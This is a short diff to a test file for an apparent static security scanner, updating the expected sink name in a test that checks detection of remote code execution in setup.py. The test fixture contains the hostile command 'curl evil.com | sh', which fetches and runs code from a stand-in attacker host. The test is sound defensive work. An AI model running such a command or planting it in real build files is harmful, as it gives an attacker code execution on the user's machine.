@@ -121,7 +121,7 @@ class TestRCEImport:
     def test_detects_system_in_setup(self):
         tree, lines = _parse("import os\nos.system('curl evil.com | sh')")
         findings = self.rule.check(tree, lines, "setup.py")
-        assert any(f.sink == "system" for f in findings)
+        assert any(f.sink == "os.system" for f in findings)
 
 
 # ── RCE-BUILD ─────────────────────────────────────────────────────────────────
